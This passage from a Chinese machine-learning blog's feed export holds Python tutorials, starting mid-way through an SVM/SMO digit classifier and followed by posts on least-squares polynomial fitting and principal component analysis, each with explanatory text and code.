class="selector-class">.models</span>[i]<span class="selector-class">.a</span>:</span><br><span class="line">            fn.write(str(ai))</span><br><span class="line">            fn.write(<span class="string">'\n'</span>)</span><br><span class="line">        fn.close()</span><br><span class="line">        fn = open(<span class="string">"models/"</span> + str(i) + <span class="string">"_b.model"</span>, <span class="string">"w"</span>)</span><br><span class="line">        fn.write(str(gv<span class="selector-class">.models</span>[i].b))</span><br><span class="line">        fn.close()</span><br><span class="line">def load_models():</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        fn = open(<span class="string">"models/"</span> + str(i) + <span class="string">"_a.model"</span>, <span class="string">"r"</span>)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fn:</span><br><span class="line">            gv<span class="selector-class">.models</span>[i]<span class="selector-class">.a</span>[j] = <span class="attribute">float</span>(line)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        fn.close()</span><br><span class="line">        fn = open(<span class="string">"models/"</span> + str(i) + <span class="string">"_b.model"</span>, <span class="string">"r"</span>)</span><br><span class="line">        gv.models[i].b = float(fn.readline())</span><br><span class="line">        fn.close()</span><br><span class="line">###</span><br><span class="line">#  T: tolerance 误差容忍度(精度)</span><br><span class="line">#  times: 迭代次数</span><br><span class="line"># 优化方法：SMO</span><br><span class="line">#  C: 惩罚系数</span><br><span class="line">#  modelnum: 模型序号0到9</span><br><span class="line">#  step: aj移动的最小步长</span><br><span class="line">###</span><br><span class="line">def train(T, times, C, modelnum, step):</span><br><span class="line">    <span class="selector-tag">time</span> = <span class="number">0</span></span><br><span class="line">    gv<span class="selector-class">.modelnum</span> = modelnum</span><br><span class="line">    update_samples_label(modelnum)</span><br><span class="line">    init_forecasterror()</span><br><span class="line">    updated = True</span><br><span class="line">    while <span class="selector-tag">time</span> &lt; times and updated:</span><br><span class="line">        updated = False</span><br><span class="line">        <span class="selector-tag">time</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(gv.samples)):</span><br><span class="line">            ai = gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.a</span>[i]</span><br><span class="line">            Ei = gv<span class="selector-class">.forecasterror</span>[i]</span><br><span class="line">            #计算违背KKT的点</span><br><span class="line">            if (gv.samples[i].label[gv.modelnum] * Ei &lt; -T and ai &lt; C) or (gv.samples[i].label[gv.modelnum] * Ei &gt; T and ai &gt; 0):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(len(gv.samples)):</span><br><span class="line">                    <span class="keyword">if</span> j == <span class="selector-tag">i</span>: continue</span><br><span class="line">                    kii = gv<span class="selector-class">.cache</span>[i][i]</span><br><span class="line">                    kjj = gv<span class="selector-class">.cache</span>[j][j]</span><br><span class="line">                    kji = kij = gv<span class="selector-class">.cache</span>[i][j] </span><br><span class="line">                    eta = kii + kjj - 2 * kij </span><br><span class="line">                    <span class="keyword">if</span> eta &lt;= <span class="number">0</span>: continue</span><br><span class="line">                    new_aj = gv.models[gv.modelnum].a[j] + gv.samples[j].label[gv.modelnum] * (gv.forecasterror[i] - gv.forecasterror[j]) / eta # f 7.106</span><br><span class="line">                    L = <span class="number">0.0</span></span><br><span class="line">                    H = <span class="number">0.0</span></span><br><span class="line">                    a1_old = gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.a</span>[i]</span><br><span class="line">                    a2_old = gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.a</span>[j]</span><br><span class="line">                    <span class="keyword">if</span> gv<span class="selector-class">.samples</span>[i]<span class="selector-class">.label</span>[gv.modelnum] == gv<span class="selector-class">.samples</span>[j]<span class="selector-class">.label</span>[gv.modelnum]:</span><br><span class="line">                        L = max(<span class="number">0</span>, a2_old + a1_old - C)</span><br><span class="line">                        H = min(C, a2_old + a1_old)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        L = max(<span class="number">0</span>, a2_old - a1_old)</span><br><span class="line">                        H = min(C, C + a2_old - a1_old)</span><br><span class="line">                    <span class="keyword">if</span> new_aj &gt; H:</span><br><span class="line">                        new_aj = H</span><br><span class="line">                    <span class="keyword">if</span> new_aj &lt; L:</span><br><span class="line">                        new_aj = L</span><br><span class="line">                    <span class="keyword">if</span> abs(a2_old - new_aj) &lt; step:</span><br><span class="line">                       # print ("j = %d, is not moving enough" % j)</span><br><span class="line">                        continue</span><br><span class="line">                    new_ai = a1_old + gv.samples[i].label[gv.modelnum] * gv.samples[j].label[gv.modelnum] * (a2_old - new_aj) # f 7.109 </span><br><span class="line">                    new_b1 = gv.models[gv.modelnum].b - gv.forecasterror[i] - gv.samples[i].label[gv.modelnum] * kii * (new_ai - a1_old) - gv.samples[j].label[gv.modelnum] * kji * (new_aj - a2_old) # f7.115</span><br><span class="line">                    new_b2 = gv.models[gv.modelnum].b - gv.forecasterror[j] - gv.samples[i].label[gv.modelnum]*kji*(new_ai - a1_old) - gv.samples[j].label[gv.modelnum]*kjj*(new_aj-a2_old)    # f7.116</span><br><span class="line">                    <span class="keyword">if</span> new_ai &gt; <span class="number">0</span> and new_ai &lt; C: new_b = new_b1</span><br><span class="line">                    elif new_aj &gt; <span class="number">0</span> and new_aj &lt; C: new_b = new_b2</span><br><span class="line">                    <span class="keyword">else</span>: new_b = (new_b1 + new_b2) / <span class="number">2.0</span></span><br><span class="line">                    update_forecasterror(<span class="selector-tag">i</span>, new_ai, j, new_aj, new_b)</span><br><span class="line">                    gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.a</span>[i] = new_ai</span><br><span class="line">                    gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.a</span>[j] = new_aj</span><br><span class="line">                    gv<span class="selector-class">.models</span>[gv.modelnum]<span class="selector-class">.b</span> = new_b</span><br><span class="line">                    updated = True</span><br><span class="line">                    print ("迭代次数: %d, 修改组合: i: %d 与 j:%d" %(time, i, j))</span><br><span class="line">                    break</span><br><span class="line"># 测试数据</span><br><span class="line">def test():</span><br><span class="line">    record = <span class="number">0</span></span><br><span class="line">    record_correct = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">img</span> <span class="keyword">in</span> gv<span class="selector-class">.tests</span>: </span><br><span class="line">        print (<span class="string">"正在测试："</span>, <span class="selector-tag">img</span>.filename)</span><br><span class="line">        <span class="keyword">for</span> modelnum <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            gv<span class="selector-class">.modelnum</span> = modelnum</span><br><span class="line">            <span class="keyword">if</span> predict(img) &gt; <span class="number">0</span>:</span><br><span class="line">                print (<span class="string">"测试结果："</span>,modelnum)</span><br><span class="line">                record += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> modelnum == int(<span class="selector-tag">img</span><span class="selector-class">.filename</span>[<span class="number">0</span>]):</span><br><span class="line">                    record_correct += <span class="number">1</span></span><br><span class="line">                break</span><br><span class="line">    print (<span class="string">"相关记录数量:"</span>, record)</span><br><span class="line">    print (<span class="string">"正确识别数量:"</span>, record_correct)</span><br><span class="line">    print (<span class="string">"正确识别比例:"</span>, record_correct/record)</span><br><span class="line">    print (<span class="string">"测试数据总量:"</span>, len(gv.tests))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print (<span class="string">"开始时间："</span>,<span class="selector-tag">time</span>.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)) </span><br><span class="line">    training = True</span><br><span class="line">    loaddata(<span class="string">"train/"</span>, gv.samples)</span><br><span class="line">    loaddata(<span class="string">"test/"</span>, gv.tests)    </span><br><span class="line">    print (<span class="string">"训练数据个数："</span>,len(gv.samples))</span><br><span class="line">    print (<span class="string">"测试数据个数："</span>,len(gv.tests))</span><br><span class="line">    <span class="keyword">if</span> training == True:</span><br><span class="line">        gv.init_cache()</span><br><span class="line">        gv.init_models()</span><br><span class="line">    print (<span class="string">"模型初始化成功！"</span>) </span><br><span class="line">    print (<span class="string">"当前时间："</span>,<span class="selector-tag">time</span>.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>))        </span><br><span class="line">    T = <span class="number">0.0001</span></span><br><span class="line">    C = <span class="number">10</span></span><br><span class="line">    step = <span class="number">0.001</span></span><br><span class="line">    gv<span class="selector-class">.sigma</span> = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> training == True:</span><br><span class="line">       <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            print (<span class="string">"正在训练模型:"</span>, i)</span><br><span class="line">            train(T, <span class="number">10</span>, C, <span class="selector-tag">i</span>, step)</span><br><span class="line">            save_models()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        load_models()</span><br><span class="line">        <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            update_samples_label(i)</span><br><span class="line">    print (<span class="string">"训练完成时间："</span>,<span class="selector-tag">time</span>.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)) </span><br><span class="line">    test()</span><br><span class="line">    print (<span class="string">"测试完成时间："</span>,<span class="selector-tag">time</span>.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>))</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7dac38a/">http://home.meng.uno/articles/7dac38a/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      调用第三方库
在此我选用的是sk-learn的关于svm的库，其关于此次实验的svm函数定义为： svm.SVC(C=8.0, kernel=‘rbf’, gamma=0.1) svm.SVC()函数的几个重要参数在其官方的介绍文档中有如下的解释： C :误差项的惩罚参数，浮点型，可选 (默认=1.0)； kernel : 指定核函数类型，字符型，可选 (默认=‘rbf’)，如果使用自定义的核函数，需要预先计算核矩阵； gamma : 浮点型, 可选 (默认=0.0)，’rbf’核函数的系数，需要注意的是，此处的gamma与课本中的sigma是互为倒数的关系（所以其可以为0）。 因为是调用别人
    
    </summary>
    
      <category term="Machine Learning" scheme="http://home.meng.uno/categories/Machine-Learning/"/>
    
    
      <category term="模式识别" scheme="http://home.meng.uno/tags/%E6%A8%A1%E5%BC%8F%E8%AF%86%E5%88%AB/"/>
    
      <category term="SVM" scheme="http://home.meng.uno/tags/SVM/"/>
    
      <category term="手写数字" scheme="http://home.meng.uno/tags/%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97/"/>
    
      <category term="分类" scheme="http://home.meng.uno/tags/%E5%88%86%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>多项式拟合曲线——最小二乘法</title>
    <link href="http://home.meng.uno/articles/1af17fd9/"/>
    <id>http://home.meng.uno/articles/1af17fd9/</id>
    <published>2016-12-17T03:59:39.000Z</published>
    <updated>2020-12-02T01:52:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>直接上代码，最小二乘法比较简单，在拟合效果上也相当不错：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre>      </td>      <td class="code">        <pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import matplotlib<span class="selector-class">.pyplot</span> as plt</span><br><span class="line">import numpy</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">f = plt.figure()</span><br><span class="line">draw = f.add_subplot(<span class="number">111</span>)</span><br><span class="line">#拟合函数的次数限制</span><br><span class="line">times=<span class="number">9</span></span><br><span class="line">tail=times+<span class="number">1</span></span><br><span class="line">x = numpy.arange(-<span class="number">2</span>,<span class="number">2</span>,<span class="number">0.1</span>)</span><br><span class="line">y = [((xi-<span class="number">1</span>)*(xi*xi-<span class="number">1</span>)+<span class="number">0.5</span>)*numpy.cos(xi) <span class="keyword">for</span> xi <span class="keyword">in</span> x]</span><br><span class="line">#所有使用到的全局变量声明</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">xlabel=[]</span><br><span class="line">ylabel=[]</span><br><span class="line">A=[]</span><br><span class="line">B=[]</span><br><span class="line">tempA=[]</span><br><span class="line">tempB=[]</span><br><span class="line">X=[]</span><br><span class="line">Y=[]</span><br><span class="line">#-----------------------------</span><br><span class="line">#生成数据，加入cos函数，作为噪声！</span><br><span class="line"><span class="keyword">for</span> xi <span class="keyword">in</span> x:</span><br><span class="line">    r=float(random.randint(80,100))/100</span><br><span class="line">    xlabel.append(xi*r)</span><br><span class="line">    ylabel.append(y[i]*r)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">draw.plot(xlabel,ylabel,<span class="attribute">color</span>=<span class="string">'b'</span>,linestyle=<span class="string">''</span>,marker=<span class="string">'*'</span>)</span><br><span class="line">length=len(xlabel)</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>,tail):</span><br><span class="line">tempA=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tail):</span><br><span class="line">temp=<span class="number">0.0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">d=<span class="number">1.0</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,j+i):</span><br><span class="line">d=d*xlabel[k]</span><br><span class="line">temp+=d</span><br><span class="line">tempA.append(temp)</span><br><span class="line">A.append(tempA)</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>,tail):</span><br><span class="line">temp=<span class="number">0.0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">d=<span class="number">1.0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,i):</span><br><span class="line">d=d*xlabel[k]</span><br><span class="line">temp+=ylabel[k]*d</span><br><span class="line">B.append(temp)</span><br><span class="line"> #X为可行解</span><br><span class="line">X=numpy<span class="selector-class">.linalg</span><span class="selector-class">.solve</span>(A,B)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'可行解a(x的系数)的矩阵表示为：[a0,---,a%d]'</span>%(times)</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(X)</span></span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">temp=<span class="number">0.0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tail):</span><br><span class="line">d=<span class="number">1.0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,j):</span><br><span class="line">d*=x[i]</span><br><span class="line">d*=X[j]</span><br><span class="line">temp+=d</span><br><span class="line">Y.append(temp)</span><br><span class="line">draw.plot(x,Y,<span class="attribute">color</span>=<span class="string">'r'</span>,linestyle=<span class="string">'-'</span>,marker=<span class="string">'.'</span>)</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/1af17fd9/">http://home.meng.uno/articles/1af17fd9/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      直接上代码，最小二乘法比较简单，在拟合效果上也相当不错：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64


# -*- coding: utf-8 -*-
import matplotlib.pyplot as plt
import numpy
import random

f
    
    </summary>
    
      <category term="Machine Learning" scheme="http://home.meng.uno/categories/Machine-Learning/"/>
    
    
      <category term="机器学习" scheme="http://home.meng.uno/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>主成分分析（PCA）</title>
    <link href="http://home.meng.uno/articles/6c0d033f/"/>
    <id>http://home.meng.uno/articles/6c0d033f/</id>
    <published>2016-12-17T03:52:21.000Z</published>
    <updated>2020-12-02T02:01:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验要求">实验要求</h2><h3 id="实验目标">实验目标</h3><p>实现一个PCA模型，能够对给定数据进行降维（即找到其中的主成分）</p><h3 id="实验过程">实验过程</h3><p>首先人工生成一些数据（如三维数据），让它们主要分布在低维空间中，如首先让某个维度的方差远小于其它维度，然后对这些数据旋转。生成这些数据后，用你的PCA方法进行主成分提取。</p><p>找一个人脸数据（小点样本量），用你实现PCA方法对该数据降维，找出一些主成分，然后用这些主成分对每一副人脸图像进行重建，比较一些它们与原图像有多大差别（用信噪比衡量）。</p><h2 id="实验准备">实验准备</h2><h3 id="降维的必要">降维的必要</h3><p>多重共线性–预测变量之间相互关联。多重共线性会导致解空间的不稳定，从而可能导致结果的不连贯。</p><p>高维空间本身具有稀疏性。一维正态分布有68%的值落于正负标准差之间，而在十维空间上只有0.02%。</p><p>过多的变量会妨碍查找规律的建立。</p><p>仅在变量层面上分析可能会忽略变量之间的潜在联系。例如几个预测变量可能落入仅反映数据某一方面特征的一个组内。</p><h3 id="降维的目的">降维的目的</h3><ul>  <li>减少预测变量的个数</li>  <li>确保这些变量是相互独立的</li>  <li>提供一个框架来解释结果</li>  <li>降维的方法</li>  <li>主成分分析</li>  <li>因子分析</li>  <li>用户自定义复合</li></ul><h2 id="有关pca">有关PCA</h2><h3 id="pca概念">PCA概念</h3><p>主成分分析 （ Principal Component Analysis ， PCA ）或者主元分析。是一种掌握事物主要矛盾的统计分析方法，它可以从多元事物中解析出主要影响因素，揭示事物的本质，简化复杂的问题。计算主成分的目的是将高维数据投影到较低维空间。给定 n 个变量的 m 个观察值，形成一个 n * m 的数据矩阵， n 通常比较大。对于一个由多个变量描述的复杂事物，人们难以认识，那么是否可以抓住事物主要方面进行重点分析呢？如果事物的主要方面刚好体现在几个主要变量上，我们只需要将这几个变量分离出来，进行详细分析。但是，在一般情况下，并不能直接找出这样的关键变量。这时我们可以用原有变量的线性组合来表示事物的主要方面，  PCA 就是这样一种分析方法。</p><h3 id="pca作用范围">PCA作用范围</h3><p>PCA 主要用于数据降维，对于一系列例子的特征组成的多维向量，多维向量里的某些元素本身没有区分性，比如某个元素在所有的例子中都为1，或者与1差距不大，那么这个元素本身就没有区分性，用它做特征来区分，贡献会非常小。所以我们的目的是找那些变化大的元素，即方差大的那些维，而去除掉那些变化不大的维，从而使特征留下的都是“精品”，而且计算量也变小了。 对于一个K维的特征来说，相当于它的每一维特征与其他维都是正交的（相当于在多维坐标系中，坐标轴都是垂直的），那么我们可以变化这些维的坐标系，从而使这个特征在某些维上方差大，而在某些维上方差很小。</p><h3 id="pca的算法步骤">PCA的算法步骤</h3><ol>  <li>    <p>设有m条n维数据。</p>  </li>  <li>    <p>将原始数据按列组成n行m列矩阵X</p>  </li>  <li>    <p>将X的每一行（代表一个属性字段）进行零均值化，即减去这一行的均值</p>  </li>  <li>    <p>求出协方差矩阵C=1/mXX’</p>  </li>  <li>    <p>求出协方差矩阵的特征值及对应的特征向量</p>  </li>  <li>    <p>将特征向量按对应特征值大小从上到下按行排列成矩阵，取前k行组成矩阵P</p>  </li>  <li>    <p>Y=PX即为降维到k维后的数据</p>  </li></ol><h2 id="实验环境">实验环境</h2><p>Spyder 作为Python开发的集成开发环境； 编程语言：Python 3.5 操作系统：macOS Sierra</p><h2 id="小结">小结</h2><h3 id="pca的应用分析">PCA的应用分析</h3><p>对于一个训练集，100个对象模板，特征是10维，那么它可以建立一个100*10的矩阵，作为样本。求这个样本的协方差矩阵，得到一个10*10的协方差矩阵，然后求出这个协方差矩阵的特征值和特征向量，应该有10个特征值和特征向量，我们根据特征值的大小，取前四个特征值所对应的特征向量，构成一个10*4的矩阵，这个矩阵就是我们要求的特征矩阵，100*10的样本矩阵乘以这个10*4的特征矩阵，就得到了一个100*4的新的降维之后的样本矩阵，每个特征的维数下降了。当给定一个测试的特征集之后，比如1*10维的特征，乘以上面得到的10*4的特征矩阵，便可以得到一个1*4的特征，用这个特征去分类。所以做PCA实际上是求得这个投影矩阵，用高维的特征乘以这个投影矩阵，便可以将高维特征的维数下降到指定的维数。</p><p>在进行基因表达数据分析时，一个重要问题是确定每个实验数据是否是独立的，如果每次实验数据之间不是独立的，则会影响基因表达数据分析结果的准确性。对于利用基因芯片所检测到的基因表达数据，如果用 PCA 方法进行分析，可以将各个基因作为变量，也可以将实验条件作为变量。当将基因作为变量时，通过分析确定一组“主要基因元素”，它们能够很好地说明基因的特征，解释实验现象；当将实验条件作为变量时，通过分析确定一组“主要实验因素”，它们能够很好地刻画实验条件的特征，解释基因的行为。</p><p>PCA作为基础的数学分析方法，其实际应用十分广泛，比如人口统计学、数量地理学、分子动力学模拟、数学建模、数理分析等学科中均有应用，是一种常用的多变量分析方法。</p><h3 id="pca优缺点">PCA优缺点</h3><h4 id="优点：">优点：</h4><p>以方差衡量信息的无监督学习，不受样本标签限制；</p><p>各主成分之间正交，可消除原始数据成分间的相互影响； 可减少指标选择的工作量；</p><p>用少数指标代替多数指标，利用PCA降维是最常用的算法； 计算方法简单，易于实现。</p><h4 id="缺点：">缺点：</h4><p>主成分解释其含义往往具有一定的模糊性，不如原始样本完整；</p><p>贡献率小的主成分往往可能含有对样本差异的重要信息；</p><p>特征值矩阵的正交向量空间是否唯一有待讨论；</p><p>属于无监督学习。</p><h2 id="代码">代码</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre>      </td>      <td class="code">        <pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">Created on Tue Nov 29 15:51:25 2016</span></span><br><span class="line"><span class="string">@author: kuangmeng</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line">import numpy as np</span><br><span class="line">import matplotlib<span class="selector-class">.pyplot</span> as plt</span><br><span class="line">#全局变量定义区</span><br><span class="line">XLabel = list()</span><br><span class="line">YLabel = list()</span><br><span class="line">phi = [<span class="number">0</span>., <span class="number">0</span>.]</span><br><span class="line">#自己定义的矩阵转换函数</span><br><span class="line">def Transport(matrix):</span><br><span class="line">        temp = list()</span><br><span class="line">        <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(matrix[<span class="number">0</span>])):</span><br><span class="line">            temp.append(list())</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(matrix)):</span><br><span class="line">                temp[i].append(matrix[j][i])</span><br><span class="line">        return temp</span><br><span class="line">#加载文件（可以通过更改文件名来加载不同的测试数据）</span><br><span class="line">data_set = open(<span class="string">'testSet.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data_set.readlines():</span><br><span class="line">    data_line = line.strip().split()</span><br><span class="line">    tmpx = <span class="attribute">float</span>(data_line[<span class="number">0</span>])</span><br><span class="line">    tmpy = <span class="attribute">float</span>(data_line[<span class="number">1</span>])</span><br><span class="line">    phi[<span class="number">0</span>] += tmpx</span><br><span class="line">    phi[<span class="number">1</span>] += tmpy</span><br><span class="line">    XLabel.append(tmpx)</span><br><span class="line">    YLabel.append(tmpy)</span><br><span class="line">phi[<span class="number">0</span>] = phi[<span class="number">0</span>]/<span class="number">100.0</span></span><br><span class="line">phi[<span class="number">1</span>] = phi[<span class="number">1</span>]/<span class="number">100.0</span></span><br><span class="line">data_set.close()</span><br><span class="line">#加载结束</span><br><span class="line">temp_x = list()</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">     temp_x.append([XLabel[i]-phi[<span class="number">0</span>], YLabel[i]-phi[<span class="number">1</span>]])</span><br><span class="line">temp_x_ = Transport(temp_x)</span><br><span class="line">sigma = np.dot(temp_x_, temp_x)</span><br><span class="line">D,V= np<span class="selector-class">.linalg</span><span class="selector-class">.eig</span>(sigma)</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">         V<span class="selector-class">.real</span>[i][j] *= -<span class="number">1</span></span><br><span class="line">temp_v_ = Transport(V.real)</span><br><span class="line">tr1 = list()</span><br><span class="line">tr1.append(XLabel)</span><br><span class="line">tr1.append(YLabel)</span><br><span class="line">tr1 = Transport(tr1)</span><br><span class="line">xr1 = np.dot(tr1, temp_v_[<span class="number">0</span>])</span><br><span class="line">xr2 = np.dot(phi, temp_v_[<span class="number">1</span>])</span><br><span class="line">xr = tr1</span><br><span class="line">#        print xr</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(XLabel)):</span><br><span class="line">      xr[i][<span class="number">0</span>] = np.dot(xr1[i], V<span class="selector-class">.real</span>[<span class="number">0</span>][<span class="number">0</span>])+np.dot(xr2, V<span class="selector-class">.real</span>[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">      xr[i][<span class="number">1</span>] = np.dot(xr1[i], V<span class="selector-class">.real</span>[<span class="number">1</span>][<span class="number">0</span>])+np.dot(xr2, V<span class="selector-class">.real</span>[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">#        print xr</span><br><span class="line">plt.plot(XLabel, YLabel, <span class="string">'r+'</span>)</span><br><span class="line">temp_xr = Transport(xr)</span><br><span class="line">plt.plot(temp_xr[<span class="number">0</span>], temp_xr[<span class="number">1</span>], <span class="string">'b*'</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(len(XLabel)):</span><br><span class="line">     plt.plot([XLabel[i],xr[i][<span class="number">0</span>]], [YLabel[i],xr[i][<span class="number">1</span>]])</span><br><span class="line">plt.axis([-<span class="number">8</span>,<span class="number">6</span>,-<span class="number">5</span>,<span class="number">5</span>])</span><br><span class="line">plt<span class="selector-class">.xlabel</span> = <span class="string">'x'</span></span><br><span class="line">plt<span class="selector-class">.ylabel</span> = <span class="string">'y'</span></span><br><span class="line">plt.show()</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/6c0d033f/">http://home.meng.uno/articles/6c0d033f/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      实验要求
实验目标
实现一个PCA模型，能够对给定数据进行降维（即找到其中的主成分）

实验过程
首先人工生成一些数据（如三维数据），让它们主要分布在低维空间中，如首先让某个维度的方差远小于其它维度，然后对这些数据旋转。生成这些数据后，用你的PCA方法进行主成分提取。

